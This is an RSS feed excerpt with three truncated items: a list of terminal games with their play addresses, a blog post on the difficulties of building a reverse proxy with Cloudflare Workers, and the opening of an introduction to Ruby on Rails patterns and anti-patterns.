<p>See also <a href="https://en.wikipedia.org/wiki/Punched_card">Wikipedia</a>.</p>

<h3 id="beasts"><a href="https://peteg.org/beasts/beasts.html">beasts</a></h3>

<p>The game Beasts is a Linux version of the old DOS game called Beast.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Beast_(video_game)">Wikipedia</a>.</p>

<h3 id="beyond-the-tesseract"><a href="https://www.wurb.com/if.php/game/211">beyond the tesseract</a></h3>

<p>A highly conceptual game in which you interact with abstract concepts and mathematical entities as if they were tangible.</p>

<p><strong>Play</strong>: <code>telnet or ssh on sdf.org</code></p>

<h3 id="blocks">blocks</h3>

<p>A block-based puzzle game.</p>

<h3 id="bluemoon"><a href="http://www.catb.org/~esr/bluemoon/">bluemoon</a></h3>

<p>The Blue Moon card solitaire.</p>

<h3 id="bj">bj</h3>

<p>a black-jack card game.</p>

<p><strong>Play</strong>: <code>telnet or ssh on sdf.org</code></p>

<h3 id="boggle"><a href="https://man.openbsd.org/OpenBSD-current/man6/boggle.6">boggle</a></h3>

<p>Word search game. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Boggle">Wikipedia</a>.</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="bombardier"><a href="https://packages.debian.org/en/sid/i386/games/bombardier">bombardier</a></h3>

<p>This game is the same as the old Blitz16 game on Commodore 16/Plus 4, written by Simon Taylor.</p>

<h3 id="boulder-dash">boulder dash</h3>

<p>A Boulder Dash game clone for your favorite terminal. You are trapped in the CAVEZ of PHEAR, your mission is to escape through all the caves and make it out alive. To escape through a cave you will have to find all the diamonds located in it. Once you’ve found all the diamonds, their powers combined will help you get to the next cave, one step closer to freedom.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Boulder_Dash">Wikipedia</a>.</p>

<h3 id="bowling"><a href="https://github.com/haliphax/pybowl">bowling</a></h3>

<p><a href="https://asciinema.org/a/41475"><img src="https://asciinema.org/a/41475.svg" alt="asciicast"></a></p>

<p>Python bowling game using the Blessed terminal library.</p>

<h3 id="braincurses"><a href="https://sourceforge.net/projects/braincurses/">braincurses</a></h3>

<p>A nice version of the mastermind game.</p>

<h3 id="brogue"><a href="https://sites.google.com/site/broguegame/">brogue</a></h3>

<p>Brogue is a Roguelike game.</p>

<h3 id="bs"><a href="https://man.openbsd.org/OpenBSD-current/man6/bs.6">bs</a></h3>

<p>Battleships game. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Battleship_%28game%29">Wikipedia</a>.</p>

<h3 id="caesar"><a href="https://man.openbsd.org/caesar.6">caesar</a></h3>

<p>decrypt caesar cyphers</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Wikipedia</a>.</p>

<h3 id="canfield"><a href="https://man.openbsd.org/OpenBSD-current/man6/canfield.6">canfield</a></h3>

<p>The solitaire card game canfield. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Canfield_%28solitaire%29">Wikipedia</a>.</p>

<h3 id="caribbean-stud">Caribbean Stud</h3>

<p>a multi-player card game, written by Hero</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="cataclysm-dark-days-ahead"><a href="https://web.archive.org/web/20190209031801/http://en.cataclysmdda.com/">cataclysm: dark days ahead</a></h3>

<p>Cataclysm: Dark Days Ahead is a roguelike set in a post-apocalyptic world. Surviving is difficult: you have been thrown, ill-equipped, into a landscape now riddled with monstrosities of which flesh eating zombies are neither the strangest nor the deadliest.</p>

<h3 id="cavez-of-phear">cavez of phear</h3>

<p>cavez of phear is a boulder dash / digger like game for console using ncurses.</p>

<h3 id="cbattleship"><a href="https://github.com/gnomengineer/cBattleship">cbattleship</a></h3>

<p>A implementation of the classic Battleship game in C++. Includes a server program, and multiple different client programs. The server program wait’s until two client program connected to start a game. The server dictates the rules of the game.</p>

<h3 id="cblocks"><a href="https://www.muppetlabs.com/~breadbox/software/cgames.html">cblocks</a></h3>

<p>a set of sliding-block puzzles.</p>

<h3 id="checkers">Checkers</h3>

<p>a two-player board game, written by Alexi</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="chess"><a href="https://github.com/bolknote/SedChess">chess</a></h3>

<p>Chess implemented in sed utility.</p>

<h3 id="gnuchess"><a href="https://www.gnu.org/software/chess/">gnuchess</a></h3>

<p>GNU Chess is a chess-playing program.</p>

<p><strong>Play</strong>: <code>telnet freechess.org 5000 (login guest)</code></p>

<h3 id="chimaera"><a href="https://www.mipmip.org/C_games/">chimaera</a></h3>

<p>A highly unusual “infinite” adventure game written by Chris Newall.</p>

<h3 id="chroma"><a href="http://www.level7.org.uk/chroma/">chroma</a></h3>

<p>A challenging puzzle game.</p>

<h3 id="ckhet"><a href="https://mbays.freeshell.org/ckhet/">ckhet</a></h3>

<p>Curses implementation of the laser board game Khet.</p>

<p><strong>Play</strong>: <code>ssh ckhet@sshgames.thegonz.net; password: ckhet</code></p>

<h3 id="clines"><a href="http://manticore.2y.net/prj/clines-a.html">clines</a></h3>

<p>Clines is a standard “Lines” game, implemented as a curses application.</p>

<h3 id="clines-1"><a href="https://github.com/veselov/clines">clines</a></h3>

<p>Color Lines clone in console.</p>

<h3 id="cmines"><a href="https://www.muppetlabs.com/~breadbox/software/cgames.html">cmines</a></h3>

<p>minesweeper.</p>

<h3 id="cnibbles"><a href="http://cnibbles.sourceforge.net/">cnibbles</a></h3>

<p>Another Nibbles game with good and smooth animations.</p>

<h3 id="open-adventure"><a href="https://gitlab.com/esr/open-adventure">Open Adventure</a></h3>

<p>Colossal Cave Adventure (also known as ADVENT, Colossal Cave, or Adventure) is one of the earliest computer adventure games and a precursor form of role playing video game. The original version was designed by Will Crowther, a programmer and caving enthusiast who based the layout on part of the Mammoth Cave system in Kentucky.</p>

<h3 id="connect-four">Connect Four</h3>

<p>a two-player slot game, written by Sarac</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="connect4"><a href="https://github.com/badescunicu/connect4">connect4</a></h3>

<p>The Connect4 game using ncurses C library.</p>

<h3 id="conquest"><a href="https://github.com/beejjorgensen/conquest">Conquest</a></h3>

<p>Port of the old Amiga Conquest text-based game</p>

<h3 id="conquest-1"><a href="https://github.com/jtrulson/conquest/">conquest</a></h3>

<p>a real-time, multi-player space warfare game.</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="gnu-conquest"><a href="https://sourceforge.net/projects/gnu-conquest/">gnu-conquest</a></h3>

<p>A multiplayer galactic game.</p>

<h3 id="corewar"><a href="http://www.corewar.info/">corewar</a></h3>

<p>Core War is a programming game created by D. G. Jones and A. K. Dewdney in which two or more battle programs (called “warriors”) compete for control of a virtual computer.</p>

<h3 id="cpat"><a href="http://cpat.sourceforge.net/">cpat</a></h3>

<p>CPat is probably the best card game for the Linux console; it is a collection of many solitaire/patience games from the most famous to less known games.</p>

<h3 id="crawl"><a href="https://crawl.develz.org/wordpress/">crawl</a></h3>

<p><a href="https://asciinema.org/a/524"><img src="https://asciinema.org/a/524.svg" alt="asciicast"></a></p>

<p>One of the best games for the Linux console.</p>

<h3 id="cribbage"><a href="https://man.openbsd.org/OpenBSD-current/man6/cribbage.6">cribbage</a></h3>

<p>The card game cribbage. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Cribbage">Wikipedia</a>.</p>

<h3 id="cryptrover"><a href="https://code.google.com/archive/p/cryptrover/">cryptrover</a></h3>

<p>Escape From The Crypt.</p>

<h3 id="ctris"><a href="https://github.com/dominikhackl/ctris">ctris</a></h3>

<p>Another version of the tetris game.</p>

<h3 id="cursedmate"><a href="https://web.archive.org/web/20130804035452/http://www.uberwall.org/~dash/">cursedmate</a></h3>

<p>A game with a hacking atmosphere.</p>

<h3 id="curse-of-war"><a href="https://a-nikolaev.github.io/curseofwar/">curse-of-war</a></h3>

<p>Curse of War is a fast-paced action strategy game for Linux originally implemented using ncurses user interface.</p>

<h3 id="dab"><a href="https://netbsd.gw.com/cgi-bin/man-cgi?dab+6+NetBSD-6.0">dab</a></h3>

<p>Dots and Boxes game.</p>

<h3 id="diablorl"><a href="https://diablo.chaosforge.org/">diablorl</a></h3>

<p>DiabloRL is a roguelike “unmake” of the popular Blizzard game Diablo.</p>

<h3 id="doomrl"><a href="https://drl.chaosforge.org/">doomrl</a></h3>

<p>DoomRL (Doom, the Roguelike) is a fast and furious coffee-break Roguelike game, that is heavily inspired by the popular FPS game Doom by ID Software.</p>

<h3 id="dopewars"><a href="https://dopewars.sourceforge.io/">dopewars</a></h3>

<p>A funny game about trading drugs. Dopewars is a free rewrite of a game originally based on Drug Wars by John E. Dell.</p>

<p><strong>Play</strong>: <code>telnet or ssh on sdf.org</code></p>

<h3 id="dsol"><a href="https://feld.me/pub/vga_cardgames-1.3.1.tgz">dsol</a></h3>

<p>dSol is a command line solitaire card game.</p>

<h3 id="duel-commander"><a href="https://sourceforge.net/projects/duelcommander/">duel commander</a></h3>

<p>Duel Commander is a turn based command line fighting game for Windows and Unix-like systems.</p>

<h3 id="dungeon-crawl"><a href="http://www.dungeoncrawl.org/">dungeon crawl</a></h3>

<p>Dungeon Crawl, a text-based roguelike game.</p>

<h3 id="dwarf-fortress"><a href="https://www.bay12games.com/dwarves/">dwarf fortress</a></h3>

<p>Dwarf Fortress is a single-player fantasy game.</p>

<h3 id="emacs"><a href="https://www.emacswiki.org/emacs/CategoryGames">emacs</a></h3>

<p>Actually it is not a game, but text editor. It includes a bunch of text games like chess, sokoban, pong etc.</p>

<h3 id="encircled"><a href="http://www.roguebasin.com/index.php?title=Encircled">encircled</a></h3>

<p>Encircled is a roguelike game.</p>

<h3 id="enigma"><a href="https://www.chiark.greenend.org.uk/~sgtatham/enigma/">enigma</a></h3>

<p>A puzzle game where items have to be collected in the right order.</p>

<h3 id="eyangband"><a href="http://eyangband.sourceforge.net/">eyangband</a></h3>

<p>Another variant of Angband.</p>

<h3 id="factor"><a href="https://man.openbsd.org/factor.6">factor</a></h3>

<p>factor a number, generate primes</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Factorization">Wikipedia</a>.</p>

<h3 id="fbird-screencast"><a href="https://github.com/nanochess/fbird">fbird</a> <a href="https://www.youtube.com/watch?v=p31XFFAeze4">Screencast</a></h3>

<p>F-Bird, a text bootsector game</p>

<h3 id="fish"><a href="https://man.openbsd.org/OpenBSD-current/man6/fish.6">fish</a></h3>

<p>Play ``Go Fish’’. It’s a BSD game.</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Go_Fish">Wikipedia</a>.</p>

<h3 id="fortune"><a href="https://man.openbsd.org/fortune.6">fortune</a></h3>

<p>print a random, hopefully interesting, adage</p>

<p>See also <a href="https://en.wikipedia.org/wiki/Fortune_%28Unix%29">Wikipedia</a>.</p>

<h3 id="freecell"><a href="https://www.linusakesson.net/software/freecell.php">freecell</a></h3>

<p>This is a console (ncurses) version of the popular and addictive solitaire game.</p>

<p><strong>Play</strong>: <code>telnet mud.darkerrealms.org 2000</code></p>

<h3 id="freesweep"><a href="https://code.google.com/archive/p/freesweep/">freesweep</a></h3>

<p>minesweeper game using curses.</p>

<h3 id="freesweep-1"><a href="https://github.com/rwestlund/freesweep">freesweep</a></h3>

<p>Freesweep is a console minesweeper-style game written in C for Unix-like systems.</p>

<h3 id="fkmines"><a href="https://sourceforge.net/projects/fkmines/">fkmines</a></h3>

<p>Another minesweeper-style game.</p>

<h3 id="frozen-depths"><a href="https://frozendepths.net/">frozen depths</a></h3>

<p>A very nice roguelike game with an entertaining atmosphere.</p>

<h3 id="frotz"><a href="https://davidgriffith.gitlab.io/frotz/">frotz</a></h3>

<p>Frotz is an interpreter for Infocom games and other Z-machine games.</p>

<h3 id="galaxis"><a href="http://www.catb.org/esr/galaxis/">galaxis</a></h3>

<p>Find the lost lifeboats from an interstellar liner.</p>

<h3 id="gameroom">gameroom</h3>

<p>11 arcade games</p>

<p><strong>Play</strong>: <code>ssh gameroom@bitreich.org</code></p>

<h3 id="gearhead"><a href="http://www.gearheadrpg.com/">gearhead</a></h3>

<p>GearHead is the first roguelike to explore the world of “mechas” (giant robots).</p>

<h3 id="gnake">gnake</h3>

<p>Another variant of the snake game with a smooth movement.</p>

<h3 id="gnugo"><a href="https://www.gnu.org/software/gnugo/">gnugo</a></h3>

<p>GNU Go is a free …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ligurio.github.io/awesome-ttygames/">https://ligurio.github.io/awesome-ttygames/</a></em></p>]]>
            </description>
            <link>https://ligurio.github.io/awesome-ttygames/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057750</guid>
            <pubDate>Wed, 11 Nov 2020 12:24:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardly Working with Cloudflare Workers]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25057709">thread link</a>) | @malthejorgensen
<br/>
November 11, 2020 | https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers | <a href="https://web.archive.org/web/*/https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <!-- Possible titles:
Cloudflare workers are hard to work with
Working with Cloudflare Workers
Hardly working with Cloudflare Workers
-->

<p><em>Note: The team behind Notifly also runs <a href="https://www.eduflow.com/">Eduflow</a> and <a href="https://www.peergrade.io/">Peergrade</a>.</em></p>

<h2 id="introduction">Introduction</h2>

<p>This is the story of me trying to replace a simple NGINX reverse proxy (plus some basic redirects) with a Cloudflare Worker.</p>

<p>Our old landing page is a Wordpress blog hosted on WPEngine. Historically, this has always been set up behind an NGINX reverse proxy serving at <a href="http://peergrade.io/">peergrade.io</a> and <a href="http://www.peergrade.io/">www.peergrade.io</a>. The reverse proxy was needed for doing various redirects outside of Wordpress and doing some cookie trickery to redirect to <a href="http://app.peergrade.io/">app.peergrade.io</a> if the session cookie for the app was present.</p>

<p>The reverse proxy is hosted on DigitalOcean and is the only thing we have hosted there, so I wanted to get rid of it. We already use Cloudflare and so I thought “this would be a good test to try out Cloudflare Workers”. And less infrastructure is better, right?</p>

<h2 id="the-good-parts">The good parts</h2>

<p>Getting set up with <code>wrangler</code> – the CLI for Cloudflare Workers – was a breeze. It gives you a webpack setup out of the box which allowed me to install NPM packages and use them without any extra work on my part. I eventually downgraded to a setup without webpack (called “javascript” in <code>wrangler</code>) – since I ended up not needing any packages.</p>

<p>The vanilla Javascript setup allows you to “live edit” the worker at <code>https://dash.cloudflare.com/&lt;account-id&gt;/workers/edit/&lt;worker-slug&gt;</code></p>

<p>Here you can edit and run the updated script without saving and deploying the worker, allowing for a very fast and easy “edit-compile-run” loop.</p>

<p>Another cool thing is that you can change the URL in the small “browser” on the page to your liking – this is very useful for testing out proxies and other things that depend on the domain name or precise URL being sent to the worker. The debugger part of the UI is also incredibly useful but does have a tendency to disconnect from time to time.</p>

<h2 id="page-rules-vs-workers">Page Rules vs. Workers</h2>

<p>In a classic setup you’ll usually have a couple of redirects alongside your reverse proxy – and so do we. We use <a href="http://www.peergrade.io/">www.peergrade.io</a> as our canonical domain so we redirect peergrade.io to www.peergrade.io and we redirect http:// to https://.</p>

<p>This can be set up easily in Cloudflare by adding a couple of redirects in your Page Rules.</p>

<p>However, redirects from page rules are applied after any worker on the same URL. Since my worker’s default action is to reverse proxy, the redirect page rule will never be hit.</p>

<p>Annoyingly, this isn’t clearly described in the docs and you’ll have to find <a href="https://community.cloudflare.com/t/cf-workers-and-rate-limiting-firewall-rules-bot-management/132164/3">this forum post</a> from the official Cloudflare forum to know that.
The post notes that “<em>security-related ones will run before [workers]</em>” – but which ones are those? (All respect to Kenton Varda who wrote the post and is the main architect behind Cloudflare Workers. Cloudflare Workers <em>are</em> very very cool, but they are also a bit more quirky than I’d like at the moment)</p>

<p>In order to preserve these redirects, I’ll have to manually write them in the worker code (or relay the URLs that need to redirect to Cloudflare itself – which is basically the same amount of code).</p>

<!-- 
- An aside:

    Apparently *Always Use HTTPS* is such a "security-related" page rule, even though it's basically an http:// to https:// redirect. Cloudflare even admits to that [in the docs](https://support.cloudflare.com/hc/en-us/articles/204144518-SSL-FAQ#h_a61bfdef-08dd-40f8-8888-7edd8e40d156). 

    Cloudflare Page Rules allows you to set up multiple rules for a single URL-pattern, but then only allows you to use that pattern once. However, *Always Use HTTPS* is special and doesn't allow any other rules once it's used on a URL-pattern. This means if you want *Automatic HTTPS Rewrites* on top of *Always Use HTTPS* you have to specify 2 rules:

    1. www.peergrade.io – *Always Use HTTPS*
    2. [https://www.peergrade.io](https://www.peergrade.io) – *Automatic HTTPS Rewrites*
-->

<p>The same thing goes for cache rules. I had previously been using a page rule to aggressively cache static assets and user-uploaded content served from Wordpress. That now has to be written inside the worker as well.</p>

<p>Page rules have an internal ordering that you can set. Rules that match the given URL are executed in order – so that if two redirect rules match the URL, the first one in the ordering will be used. It would be <em>really nice</em> if workers could be added to the same list – that would mean I could put the redirects and cache rules before my worker and much more easily handle this scenario. <em>In principle</em> this would be easy if all the built-in page rules were reimplemented as workers, but there’s probably legacy behaviors and tie-ins to the rest of the stack that makes that impossible or at least non-trivial. (Still hoping for a future update on this 🤞🏻)</p>

<h2 id="the-reverse-proxy">The reverse proxy</h2>

<p>Back to the main task at hand – we’re implementing a simple reverse proxy and that happens to be <a href="https://developers.cloudflare.com/workers/examples/bulk-origin-proxy">one of the examples</a> in the Cloudflare Worker docs. However, getting it set up myself I quickly ran into issues with redirect loops and cases where my origin would redirect for seemingly no reason. To be fair, proxying can be tricky to get right since it’s hard to test properly before rollout, and on top of that you have DNS propagation and caching, which means there might be timing issues. But even with that, it seemed extra tricky with Cloudflare Workers.</p>

<p>On closer inspection, the example from the Cloudflare docs seems to defy reasoning. The incoming request in the example must have the header <code>Host: google.yourdomain.com</code> in order for it to match the Google entry in <code>ORIGINS</code>. I was able to confirm as much by inspecting the incoming request in the Cloudflare worker debugger. That incoming request is then relayed directly to <code>www.google.com</code>. Let’s try that ourselves:</p>

<div><div><pre><code>curl -H 'Host: google.yourdomain.com' https://www.google.com
</code></pre></div></div>

<p>The response we get is a 404 page (which makes sense since the host doesn’t match). However, the Cloudflare worker doesn’t get a 404 – it renders the familiar Google search frontpage. Something must be happening behind the scenes. That something is what I call “The Web Platform” part of Cloudflare Workers.</p>

<h2 id="the-web-platform">The Web Platform</h2>

<p>Cloudflare Workers uses Chrome’s V8 as its execution engine and this also sets the context in which your script is run.</p>

<p>The available API is a very small subset of <a href="https://platform.html5.org/">The Web Platform</a> (the Javascript API available in modern browsers) – specifically Ecmascript/Javascript itself, plus <code>Fetch</code>, <code>URL</code>, and <code>Blob</code>. I believe Cloudflare chose this API because it melds well with V8, but also because web devs will be familiar with those APIs. But how familiar are you <em>really</em> with <code>fetch</code>, <code>Request</code>, and <code>Response</code>? (all part of the <code>Fetch</code>-spec)<br>
I don’t think I actually knew the <code>Request</code> and <code>Response</code>-objects in any detail before using Cloudflare Workers – having gotten along just fine with variations of</p>

<div><div><pre><code>fetch('http://example.org', { options }).then((r) =&gt; r.json())
</code></pre></div></div>

<p>plus some error handling on top for many years.</p>

<p>When working with Workers what you’ll mostly be doing is to manipulate the incoming <code>Request</code>-object  and pass it on to <code>fetch</code>, or manipulate the outgoing <code>Response</code>-object and passing that on to Cloudflare’s handler. Have you ever manually created a <code>Request</code>-object in the browser? I haven’t. The reason this gets complicated is the fact that the spec for <code>fetch</code> itself is very “loose”. For example, <code>fetch</code> can take either a <code>Request</code>-object or a simple Javascript object that just looks a lot like a <code>Request</code>-object as its argument – and it not really clear what differences between the two are.
<code>fetch</code> also allows passing a <code>Request</code>-objects as both its first and second argument <code>fetch(Request(...), Request(...))</code> – good luck trying to figure out what that does!</p>

<p>If we go back to the example from the Cloudflare docs – what’s going on “behind the scenes” in our proxy example from earlier is that you can’t change the <code>Host</code>-header when doing a <code>fetch</code>. This makes a lot of security sense in the browser where <code>fetch</code> normally lives, but it’s quite normal behavior for a reverse proxy and actually something I was doing in my NGINX setup in order to have WPEngine respond with the right content. It’s not a behavior you’ve ever needed or thought about when using <code>fetch</code> in the browser.
The server is just a very different environment than the browser. The browser Javascript API is not built with server functionality in mind, and it ends up being a hamstring when working with Cloudflare Workers.</p>

<h2 id="maybe-maybe-maybe">Maybe, maybe, maybe…?</h2>

<p>A bunch of forum posts on community.cloudflare.com talk about this issue</p>

<ul>
  <li><strong>Only available on the Enterprise plan?</strong> <a href="https://community.cloudflare.com/t/override-host-header-using-workers/73434/2">This forum post</a> describes that setting the <code>Host</code> -header in workers is not possible. Followed up with <a href="https://community.cloudflare.com/t/override-host-header-using-workers/73434/5">a later answer</a> that it’s possible but only for Enterprise accounts.
 <a href="https://community.cloudflare.com/t/reverse-proxy-using-page-rules/47836/16">This other post</a> says the same.</li>
  <li><strong>Kenton Varda to the rescue</strong> In response to <a href="https://community.cloudflare.com/t/not-possible-to-override-the-host-header-on-workers-requests/13077/7">this post</a> Kenton Varda actually extends Cloudflare Workers with the <code>cf.resolveOverride</code>-flag on the <code>Request</code>-object,
which should allow at least part of the reverse proxy setup to work.
Unfortunately, to explain the new feature the post just links to the top-level URL of the documentation for Cloudflare Workers – which currently doesn’t
describe how  <code>cf.resolveOverride</code> works and how to use it.</li>
  <li><strong>The missing documentation</strong> <a href="https://community.cloudflare.com/t/different-hostname-with-same-origin-in-workers/16662/12">This older post</a> seemingly cites documentation that no longer exists! :(<br>
 I have been unable to find any meaningful documentation of <code>cf.resolveOverride</code> outside of the community forum, and I was unable to have it allow me to switch the <code>Host</code>-header.</li>
</ul>

<h2 id="the-final-nail-in-the-coffin">The final nail in the coffin</h2>

<p>For a brief moment I actually thought my setup was working, but it only “looked” like it was working due to the following sequence of events:</p>

<ul>
  <li>A request for <code>www.peergrade.io</code> would hit the worker</li>
  <li>The worker would then do a request to <code>peergrade.wpengine.com</code></li>
  <li>Wordpress/WPEngine would then respond with a redirect to <code>www.peergrade.io</code> since the <code>Host</code>-header is incorrect</li>
  <li>Cloudflare by default then follows that redirect and makes a new request to <code>www.peergrade.io</code>.
Since Cloudflare is the host of <code>www.peergrade.io</code> you’d think we’d hit infinite recursion here.
But magically, it doesn’t just enter the worker script again – it knows (somehow) it has to go further down the Cloudflare stack.
Since the DNS A-record in Cloudflare still had the IP of the DigitalOcean instance, that final fetch would simply fetch the page from the old proxy server which worked as it always had 🤦🏻</li>
</ul>

<!--
Another example of this "familiar but unfamiliar" API is when I was trying to inspect the session cookie: I had to do a base64 decode into a `Uint8Array` (in order to do a zlib decompression). The function available for decoding base64 is `atob` which you may know from the browser.

However, in order to get the actual binary data you'll have to do this Javascript incantation:

```jsx
const weirdstr = atob(cookiestr);
const bytearray = new Uint8Array(new ArrayBuffer(weirdstr.length));

for (let i = 0; i < weirdstr.length; i++) {
  bytearray[i] = weirdstr.charCodeAt(i);
}
```

Again, this isn't Cloudflare's fault per se, but they're inheriting a bad choice from The Web Platform where they could have done something else. That bad choice becomes accentuated by the fact that most workers need to implement something that is basically backend or proxy server behavior, which by now you can see The Web Platform really isn't set up for. 

Similarly, you'll inherit this weird quirk directly from the browser Javascript engine:

```jsx
console.log(btoa('汉字'))
// The above raises a DOMException in your Cloudflare Worker with the
// following message:
// "btoa() can only operate on characters in the Latin1 (ISO/IEC 8859-1) range."
```

Yes yes, there's some sense to this – Javascript strings are UTF-16 and that's why this example doesn't work. But take a look at Node.js where `btoa` and `atob` are not available – Node.js has a much better answer to many of these problems.

Lastly, since many things are iterables or DOM-objects, you won't get anything useful out of console logging `request.headers`, `request.headers.keys()`, `request.headers.values()`, `request.headers.entries()`. This wouldn't be a problem if the `request`-object was fully inspectable in the debugger but nothing shows up when you open up `request.headers`.
The solution to this is just `console.log([...request.headers])`.
-->

<h2 id="conclusion">Conclusion</h2>

<p>Overall, Cloudflare Workers are really cool and the tooling around them is pretty great. But I do feel like it was an unfortunate choice to adopt The Web Platform
instead of using parts of the Node standard library or a different, more server-oriented API. Lastly, while the documentation feels fairly complete and fleshed out – the fact
that the answers on the forum tell 2-3 different stories about whether it’s possible to change the <code>Host</code>-header means that it’s something that is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers">https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers</a></em></p>]]>
            </description>
            <link>https://blog.notifly.io/2020/11/04/hardly-working-with-cloudflare-workers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057709</guid>
            <pubDate>Wed, 11 Nov 2020 12:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Ruby on Rails Patterns and Anti-Patterns]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057531">thread link</a>) | @nikolalsvk
<br/>
November 11, 2020 | https://pragmaticpineapple.com/introduction-to-ruby-on-rails-patterns-and-anti-patterns/ | <a href="https://web.archive.org/web/*/https://pragmaticpineapple.com/introduction-to-ruby-on-rails-patterns-and-anti-patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><span>
      <span></span>
  <img alt="Rails Patterns" title="Rails Patterns" src="https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/1c72d/cover.jpg" srcset="https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/a80bd/cover.jpg 148w,
https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/1c91a/cover.jpg 295w,
https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/1c72d/cover.jpg 590w,
https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/a8a14/cover.jpg 885w,
https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/fbd2c/cover.jpg 1180w,
https://pragmaticpineapple.com/static/7f940e1f59fb7478eacebcbcf26b6f7c/e5166/cover.jpg 1200w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>

<p>Welcome to the first post in our series about Ruby on Rails Patterns and Anti-patterns. In each of the posts, we’ll take a deep dive into all sorts of patterns you might come across while working with Rails apps.</p>
<p>Today, we’ll show what a (design) pattern is and then try to explain what an anti-pattern is as well. To better illustrate explanations, we will use the Ruby on Rails framework that has been around for quite some time. If Rails isn’t your cup of tea for some reason, hang on, the ideas (or patterns) described here might resonate with whatever technology you wind up using.</p>
<p>But before we jump into explaining what patterns and anti-patterns are, how did we get to the point where we need them? Why do we need to have all these things for our software? Why do we need to <strong>design</strong> our solution?</p>
<h2 id="yes-you-are-a-designer"><a href="#yes-you-are-a-designer" aria-label="yes you are a designer permalink"></a>Yes, You Are a Designer</h2>
<p>Even from early computer programming days, people had to deal with the design of the programs they were writing. To write a program (or software) is to design a solution for a problem. When you write software, you are a designer—feel free to append that to your job title. Designing good solutions is important because the software we write will be read and/or edited by others. Also, the solutions we come up with will be built on by others in the future.</p>
<p>Having all this in mind, generations of engineers started seeing similar designs in code and architecture throughout their careers. Folks started extracting and documenting standard solutions to problems. Some would say it’s a natural way of how we as humans function. We like to <a href="https://en.wikipedia.org/wiki/Principles_of_grouping">categorize</a> and <a href="https://en.wikipedia.org/wiki/Gestalt_psychology#Pr%C3%A4gnanz">find patterns</a> in everything, and software is no exception to that.</p>
<p>Being human, as we are, patterns started emerging more and more as software engineering got more complex. Software design patterns began to develop and cement themselves with engineers around the world. Books, essays, and talks were given, further spreading ideas of well thought out and battle-tested solutions. Those solutions saved a lot of people time and money, so let’s go over the term design pattern, and see what it truly is.</p>
<h2 id="what-is-a-design-pattern"><a href="#what-is-a-design-pattern" aria-label="what is a design pattern permalink"></a>What Is a Design Pattern?</h2>
<p>In software engineering, a pattern is described as a solution that can be reused to solve a common problem. The pattern is something that is considered a good practice among software engineers. Since software engineers set them, they can quickly go from patterns to their opposite—anti-patterns—but we’ll get to that later.</p>
<p>A design pattern will show you the way to the solution but it won’t give you a piece of code ready to be plugged into the rest of your software. Think of a pattern as a guide for writing well-designed code, but you have to come up with the implementation. Using patterns in day-to-day coding emerged in the late ‘80s, where Kent Beck and Ward Cunningham came up with an idea of using a <a href="http://c2.com/doc/oopsla87.html">‘pattern language’</a>.</p>
<p>The idea of pattern languages came in the late ’70s by Christopher Alexander in his book <a href="https://www.goodreads.com/book/show/79766.A_Pattern_Language">A Pattern Language</a>. You might be surprised, but the book is not about software engineering but the architecture of buildings. The pattern language is an organized and coherent set of patterns, each of which describes a problem and the core of a solution that can be used in many ways. Sounds familiar? (Hint: frameworks, another hint: Rails)</p>
<p>Later on, design patterns in software engineering became famous with large audiences after the legendary book <a href="https://www.goodreads.com/book/show/85009.Design_Patterns">Design Patterns</a> by the <a href="http://wiki.c2.com/?GangOfFour">Gang Of Four</a> published in 1994. In the book, there are explanations and definitions of patterns that are used nowadays — Factory, Singleton, Decorator, just to name a few.</p>
<p>Great, now that we got acquainted or refreshed our knowledge on design and patterns, let’s find out what anti-patterns are.</p>
<h2 id="what-is-a-design-anti-pattern"><a href="#what-is-a-design-anti-pattern" aria-label="what is a design anti pattern permalink"></a>What Is a Design Anti-Pattern?</h2>
<p>If you think of patterns as the good guys, the anti-patterns are the bad ones. To be more precise, a software anti-pattern is a pattern that may be commonly used but is considered ineffective or counterproductive. Typical examples of anti-patterns are God objects that contain many functions and dependencies, which could be extracted and separated into different objects.</p>
